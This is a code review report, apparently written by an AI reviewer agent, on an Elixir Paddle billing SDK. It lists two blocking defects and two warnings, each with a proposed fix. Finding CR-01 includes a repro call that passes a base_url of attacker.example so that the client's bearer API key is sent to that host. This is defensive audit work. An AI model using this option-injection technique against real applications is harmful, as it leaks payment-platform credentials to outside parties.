---
phase: 32-dependency-sdk-trust-boundary
reviewed: 2026-09-10T22:45:27Z
depth: standard
files_reviewed: 48
files_reviewed_list:
  - CHANGELOG.md
  - README.md
  - bin/phase32_compatibility.sh
  - bin/phase32_contract_proof.sh
  - demo/README.md
  - demo/mix.lock
  - guides/accrue-seam.md
  - guides/getting-started.md
  - guides/telemetry.md
  - lib/paddle/adjustments.ex
  - lib/paddle/client.ex
  - lib/paddle/customers.ex
  - lib/paddle/customers/addresses.ex
  - lib/paddle/customers/portal_sessions.ex
  - lib/paddle/error.ex
  - lib/paddle/events.ex
  - lib/paddle/http.ex
  - lib/paddle/http/telemetry.ex
  - lib/paddle/internal/pagination.ex
  - lib/paddle/notification_setting.ex
  - lib/paddle/notification_settings.ex
  - lib/paddle/portal_session.ex
  - lib/paddle/portal_sessions.ex
  - lib/paddle/prices.ex
  - lib/paddle/products.ex
  - lib/paddle/subscription/management_urls.ex
  - lib/paddle/subscriptions.ex
  - lib/paddle/transaction/checkout.ex
  - lib/paddle/transactions.ex
  - mix.exs
  - mix.lock
  - test/paddle/adjustments_test.exs
  - test/paddle/client_test.exs
  - test/paddle/customers/addresses_test.exs
  - test/paddle/customers/portal_sessions_test.exs
  - test/paddle/customers_test.exs
  - test/paddle/error_test.exs
  - test/paddle/events_test.exs
  - test/paddle/http/telemetry_test.exs
  - test/paddle/http_test.exs
  - test/paddle/inspection_safety_test.exs
  - test/paddle/notification_settings_test.exs
  - test/paddle/portal_session_test.exs
  - test/paddle/prices_test.exs
  - test/paddle/products_test.exs
  - test/paddle/seam_test.exs
  - test/paddle/subscriptions_test.exs
  - test/paddle/transactions_test.exs
findings:
  critical: 2
  warning: 2
  info: 0
  total: 4
status: issues_found
---

# Phase 32: Code Review Report

**Reviewed:** 2026-09-10T22:45:27Z
**Depth:** standard
**Files Reviewed:** 48
**Status:** issues_found

## Summary

The Phase 32 dependency, request-policy, telemetry, inspection, resource, proof-runner, documentation, and test changes were reviewed at standard depth. The full test suite passes (260 tests), shell syntax passes, and the compatibility receipt self-test passes, but those gates miss two release-blocking runtime defects. Public mutation option lists can override Req's base URL while retaining the client's bearer credential, and an unexpected provider error-body shape crashes the normalization boundary. The inspection inventory test is not actually exhaustive per module, and one public stream contract documents tuple/error yielding that the implementation does not provide.

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: [BLOCKER] Public mutation options can redirect the bearer token to another host

**File:** `lib/paddle/http.ex:35-45`

**Issue:** The central request boundary forwards every unrecognized entry from `opts` into `Req.request/2`. Six public mutation APIs merge their caller-provided `opts` directly into this list (`Paddle.Adjustments.create/3`, `Paddle.Customers.create/3`, `Paddle.Customers.Addresses.create/4`, `Paddle.Customers.PortalSessions.create/4`, `Paddle.NotificationSettings.create/3`, and `Paddle.Transactions.create/3`) even though their public type promises only `{:retry, boolean()}`. Req accepts `base_url` as a per-request option. A direct repro using `Paddle.Customers.create(client, attrs, base_url: "https://attacker.example")` dispatched to `attacker.example` with `Authorization: Bearer secret`. This defeats the validated client trust boundary and can exfiltrate the Paddle API key whenever an application forwards an insufficiently trusted option list.

**Fix:** Validate public request options before merging them with internal Req options. Reject non-keyword lists, duplicates, and every key except `:retry`; do not expose arbitrary Req configuration through resource functions. For example:

```elixir
defp validate_request_opts!(opts) do
  unless Keyword.keyword?(opts), do: raise(ArgumentError, "request options must be a keyword list")
  keys = Keyword.keys(opts)

  if Enum.uniq(keys) != keys or Enum.any?(keys, &(&1 != :retry)) do
    raise ArgumentError, "only the :retry request option is supported"
  end

  opts
end
```

Apply the validation at every public mutation entry point before `Keyword.merge/2`, and add a regression test that `:base_url`, `:auth`, `:headers`, and `:adapter` are rejected before dispatch.

### CR-02: [BLOCKER] Malformed provider error payloads crash instead of returning `Paddle.Error`

**File:** `lib/paddle/error.ex:106-123`

**Issue:** `from_response/2` assumes `body["error"]` is a map. Paddle, an intermediary, or a custom adapter can return a JSON map whose `"error"` value is a string, list, or null. The subsequent `error_body["type"]` access then raises `FunctionClauseError`. A repro with status 502 and `%{"error" => "bad-shape"}` crashes at line 114, escaping the documented `{:error, %Paddle.Error{}}` boundary and losing the new mutation-ambiguity result entirely.

**Fix:** Normalize the nested error value independently of the outer body and type-check promoted fields:

```elixir
body = if is_map(body), do: body, else: %{}
error_body =
  case Map.get(body, "error") do
    value when is_map(value) -> value
    _ -> %{}
  end
```

Add response-normalization tests for `"error" => nil`, strings, lists, and atom-keyed/unexpected maps, including an ambiguous mutation status, and assert they return a conservative `%Paddle.Error{}` rather than raising.

## Warnings

### WR-01: [WARNING] The inspection inventory silently misses additional modules in an existing file

**File:** `test/paddle/inspection_safety_test.exs:72-91`

**Issue:** The claimed exhaustive source inventory operates per file, tests whether any `defstruct`/`defexception` is followed anywhere by `raw_data`, and then records only the first `defmodule` in that file. If a second public struct with `raw_data` is added to a file that already defines a module, the test continues to report the first module and never requires classification for the new one. The broad cross-file regex can also associate one module's struct with a later module's `raw_data`. This makes the deny-by-default safety gate capable of passing while a newly introduced public value retains unsafe default inspection.

**Fix:** Inspect compiled modules/BEAM metadata or parse each source file's AST and collect every individual `defmodule` that defines a struct/exception containing `:raw_data`. Add a fixture with two modules in one source string and assert both are discovered.

### WR-02: [WARNING] Address stream documentation promises tuple errors, but the stream yields structs and raises

**File:** `lib/paddle/customers/addresses.ex:222-245`

**Issue:** The example tells consumers to match `{:ok, %Paddle.Address{}}` and `{:error, %Paddle.Error{}}`, and the Errors section says failures are yielded as tuples. `Paddle.Internal.Pagination.stream_next/1` actually emits `page.data` directly and raises on every error (`lib/paddle/internal/pagination.ex:57-64`). Consumers following this public contract will fail to match successful address structs and cannot handle later-page failures through the documented error branch.

**Fix:** Document direct `%Paddle.Address{}` elements and exception behavior, matching the already-correct high-level guidance in `guides/getting-started.md`, or change the shared stream implementation consistently across all resources if tuple-yielding is the intended API. Add a doctest or contract assertion for the documented enumeration shape.

---

_Reviewed: 2026-09-10T22:45:27Z_
_Reviewer: the agent (gsd-code-reviewer)_
_Depth: standard_
